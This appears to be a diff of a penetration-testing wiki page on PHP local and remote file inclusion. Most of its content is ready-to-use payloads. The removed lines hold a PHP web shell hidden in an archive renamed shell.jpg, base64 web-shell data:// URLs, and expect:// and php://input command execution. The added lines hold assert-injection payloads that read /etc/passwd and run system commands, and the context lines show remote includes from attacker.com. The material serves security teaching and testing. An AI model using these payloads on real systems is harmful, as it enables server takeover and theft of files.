@@ -16,6 +16,10 @@ http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
 ```
 
+{% hint style="info" %}
+In PHP, vulnerable functions are: `require`, `require_once`, `include`, `include_once`
+{% endhint %}
+
 ## Practice
 
 #### Basic LFI
@@ -195,66 +199,6 @@ http://example.com/index.php?page=php://fd/3
 ```
 {% endtab %}
 
-{% tab title="Zip & Rar" %}
-Upload a Zip or Rar file with a PHPShell inside and access it.\
-In order to be able to abuse the rar protocol it **need to be specifically activated**.
-
-```bash
-#Create the zip file
-echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
-zip payload.zip payload.php;
-mv payload.zip shell.jpg;
-rm payload.php
-
-# To compress with rar
-rar a payload.rar payload.php;
-mv payload.rar shell.jpg;
-rm payload.php
-
-#Upload the archive and access it as follow:
-http://example.com/index.php?page=zip://shell.jpg%23payload.php
-http://example.com/index.php?page=rar://shell.jpg%23payload.php
-```
-{% endtab %}
-
-{% tab title="Data" %}
-With the data wrapper, you can inject PHP code you want executing directly into the URL:
-
-{% hint style="info" %}
-Note that this wrapper is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**
-{% endhint %}
-
-```bash
-http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
-http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
-http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
-http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
-http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
-http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
-NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
-```
-{% endtab %}
-
-{% tab title="Expect" %}
-Expect wrapper **has to be activated**. You can execute code using this.
-
-```
-http://example.com/index.php?page=expect://id
-http://example.com/index.php?page=expect://ls
-```
-{% endtab %}
-
-{% tab title="Input" %}
-php://input is a read-only stream that allows you to read raw data from the request body. php://input is not available in POST requests with `enctype="multipart/form-data"` if [enable\_post\_data\_reading](https://www.php.net/manual/en/ini.core.php#ini.enable-post-data-reading) option is enabled.
-
-Specify your payload in the POST parameters
-
-```
-http://example.com/index.php?page=php://input
-POST DATA: <?php system('id'); ?>
-```
-{% endtab %}
-
 {% tab title="Others" %}
 Check more possible supported protocols [here](https://www.php.net/manual/en/wrappers.php)
 
@@ -269,19 +213,35 @@ Check more possible supported protocols [here](https://www.php.net/manual/en/wra
 {% endtab %}
 {% endtabs %}
 
+Find more PHP wrappers on this page:
+
+{% content-ref url="lfi2rce/php-wrappers.md" %}
+[php-wrappers.md](lfi2rce/php-wrappers.md)
+{% endcontent-ref %}
+
 #### LFI using PHP's assert
 
 {% tabs %}
 {% tab title="Enumerate" %}
+If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.
 
+For example, with following code is vulnerable assuming that the **$file** parameter is vulnerable to LFI
+
+```php
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+```
 {% endtab %}
 
 {% tab title="Exploit" %}
-If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.
+The following payload may work (be sure to URL-encode payloads before you send them):
 
-If a file parameter is looking like that:
+```php
+#Include files
+' and die(show_source('/etc/passwd')) or '
 
-
+#RCE
+' and die(system("whoami")) or '
+```
 {% endtab %}
 {% endtabs %}
 
